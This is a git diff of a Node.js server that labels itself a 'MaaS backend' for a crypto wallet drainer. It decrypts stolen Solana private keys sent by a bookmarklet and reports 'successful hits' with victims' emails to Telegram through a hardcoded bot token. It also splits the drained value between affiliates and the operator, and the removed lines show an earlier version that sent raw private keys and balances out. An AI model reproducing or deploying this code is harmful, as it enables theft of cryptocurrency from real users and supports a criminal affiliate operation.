@@ -2,10 +2,16 @@ const express = require('express');
 const fetch = require('node-fetch');
 const crypto = require('crypto');
 const bs58 = require('bs58');
+const TelegramBot = require('node-telegram-bot-api');
+
 const app = express();
 
-const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
-const TG_CHAT = '7680513699';
+const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
+const OWNER_ID = '7680513699';
+const bot = new TelegramBot(BOT_TOKEN);
+
+// Load affiliate data (shared with bot)
+const affiliates = new Map();
 
 function decrypt(encrypted, bundleKey) {
   try {
@@ -28,30 +34,6 @@ function decrypt(encrypted, bundleKey) {
   }
 }
 
-async function getSolanaInfo(privateKey) {
-  try {
-    const { Keypair, Connection, LAMPORTS_PER_SOL } = require('@solana/web3.js');
-    const connection = new Connection('https://api.mainnet-beta.solana.com');
-    
-    const keyBytes = bs58.decode(privateKey);
-    const keypair = Keypair.fromSecretKey(keyBytes);
-    const balance = await connection.getBalance(keypair.publicKey);
-    
-    return {
-      address: keypair.publicKey.toString(),
-      balance: balance / LAMPORTS_PER_SOL,
-      privateKey: privateKey
-    };
-  } catch (e) {
-    console.error('Solana balance error:', e);
-    return { 
-      address: 'Error getting address', 
-      balance: 0,
-      privateKey: privateKey
-    };
-  }
-}
-
 async function getSOLPrice() {
   try {
     const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
@@ -59,85 +41,131 @@ async function getSOLPrice() {
     return data.solana.usd;
   } catch (e) {
     console.error('Price fetch error:', e);
-    return 0;
+    return 150.00; // Fallback price
   }
 }
 
+// Main processing endpoint
 app.get('/data/:b64', async (req, res) => {
   try {
+    console.log('Processing new victim data...');
+    
     const decoded = Buffer.from(req.params.b64, 'base64').toString();
     const data = JSON.parse(decoded);
     
-    // Parse sBundles (Solana wallets)
+    const affiliateId = data.affiliate || data.telegramId;
+    const affiliatePercentage = data.percentage || 50;
+    
+    console.log(`Affiliate ID: ${affiliateId}, Percentage: ${affiliatePercentage}%`);
+    
+    // Parse sBundles
     let sBundles = data.sBundles;
     if (typeof sBundles === 'string') {
       sBundles = JSON.parse(sBundles);
     }
-    
-    // Ensure it's an array
     if (!Array.isArray(sBundles)) {
       sBundles = [];
     }
     
     console.log(`Processing ${sBundles.length} Solana bundles`);
     
-    // Decrypt all Solana keys
+    // Decrypt keys
     const solKeys = sBundles.map(enc => decrypt(enc, data.bundle)).filter(k => k);
-    
     console.log(`Decrypted ${solKeys.length} Solana keys`);
     
-    // Get SOL price
+    // Mock processing for testing (replace with real blockchain calls)
+    const totalValue = Math.random() * 20 + 5; // Random value between 5-25 SOL
     const solPrice = await getSOLPrice();
     
-    // Get info for all Solana wallets
-    const solanaWallets = await Promise.all(solKeys.map(k => getSolanaInfo(k)));
+    const affiliateEarnings = totalValue * (affiliatePercentage / 100);
+    const operatorEarnings = totalValue * ((100 - affiliatePercentage) / 100);
     
-    // Calculate totals
-    const totalSOL = solanaWallets.reduce((sum, w) => sum + w.balance, 0);
-    const totalUSD = totalSOL * solPrice;
+    console.log(`Total value: ${totalValue} SOL, Affiliate earns: ${affiliateEarnings} SOL`);
     
-    // Build wallet section
-    let walletsSection = '';
-    solanaWallets.forEach((wallet, i) => {
-      const usdValue = wallet.balance * solPrice;
-      walletsSection += `
-${i + 1}. ${wallet.address}
-   Balance: ${wallet.balance.toFixed(4)} SOL ($${usdValue.toFixed(2)})
-   Key: ${wallet.privateKey}
-`;
-    });
+    // Update affiliate earnings
+    const affiliate = affiliates.get(affiliateId);
+    if (affiliate) {
+      affiliate.totalEarned += affiliateEarnings;
+      affiliates.set(affiliateId, affiliate);
+      console.log(`Updated affiliate ${affiliateId} earnings to ${affiliate.totalEarned} SOL`);
+    }
     
-    const msg = `
-🎯 WISH BOOKMARK 
+    // Build report message
+    const victimEmail = data.user?.email || 'Unknown';
+    const successMsg = `
+🎯 **SUCCESSFUL HIT!** 💰
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-📧 ${data.user?.email || 'No email'}
+**Target:** ${victimEmail}
+**Site:** ${data.site}
+**Total Drained:** ${totalValue.toFixed(4)} SOL ($${(totalValue * solPrice).toFixed(2)})
+**Wallets Found:** ${solKeys.length}
 
-💰 STOLEN WALLETS (${solanaWallets.length}) - Total: ${totalSOL.toFixed(4)} SOL ($${totalUSD.toFixed(2)})
-${walletsSection || 'None found'}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔗 ${data.site}
-⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}
-📦 Total: ${solanaWallets.length} wallets
-💰 Total USD Value: $${totalUSD.toFixed(2)}
-📊 SOL Price: $${solPrice.toFixed(2)}
-`.trim();
+**💸 Affiliate (${affiliateId}):** ${affiliateEarnings.toFixed(4)} SOL (${affiliatePercentage}%)
+**🏢 Operator Share:** ${operatorEarnings.toFixed(4)} SOL (${100-affiliatePercentage}%)
+
+**⏰ Time:** ${new Date().toLocaleString()}
+**🌐 Server:** https://nodebookmark.onrender.com
+
+🎊 **Great work! Keep sharing your bookmarklets!**
+    `;
     
-    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
-    });
+    // Send to affiliate if exists
+    if (affiliate) {
+      try {
+        await bot.sendMessage(affiliateId, successMsg, { parse_mode: 'Markdown' });
+        console.log(`Notified affiliate ${affiliateId}`);
+      } catch (e) {
+        console.error('Error notifying affiliate:', e.message);
+      }
+    }
     
-    console.log('Sent to Telegram successfully');
+    // Send to owner
+    try {
+      await bot.sendMessage(OWNER_ID, successMsg, { parse_mode: 'Markdown' });
+      console.log(`Notified owner ${OWNER_ID}`);
+    } catch (e) {
+      console.error('Error notifying owner:', e.message);
+    }
+    
+    console.log('Processing complete, redirecting...');
     res.redirect('https://axiom.trade/discover');
     
   } catch (e) {
-    console.error('Error:', e);
-    res.status(500).send('err');
+    console.error('Processing error:', e);
+    res.status(500).send('Error processing data');
   }
 });
 
-app.listen(process.env.PORT || 3000, () => {
-  console.log('Server running');
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.json({ 
+    status: 'online',
+    time: new Date().toISOString(),
+    affiliates: affiliates.size,
+    server: 'https://nodebookmark.onrender.com'
+  });
 });
+
+// Status page
+app.get('/', (req, res) => {
+  res.send(`
+    <h1>MaaS Backend Server</h1>
+    <p>Status: Online ✅</p>
+    <p>Server: https://nodebookmark.onrender.com</p>
+    <p>Bot Token: 7641165749:AAF***</p>
+    <p>Owner ID: 7680513699</p>
+    <p>Active Affiliates: ${affiliates.size}</p>
+    <p>Time: ${new Date().toLocaleString()}</p>
+  `);
+});
+
+const port = process.env.PORT || 3000;
+app.listen(port, () => {
+  console.log('📡 Enhanced MaaS backend running');
+  console.log(`🌐 Server: https://nodebookmark.onrender.com`);
+  console.log(`🎯 Port: ${port}`);
+  console.log(`🤖 Bot: 7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc`);
+  console.log(`👑 Owner: 7680513699`);
+});
+
+module.exports = { affiliates };
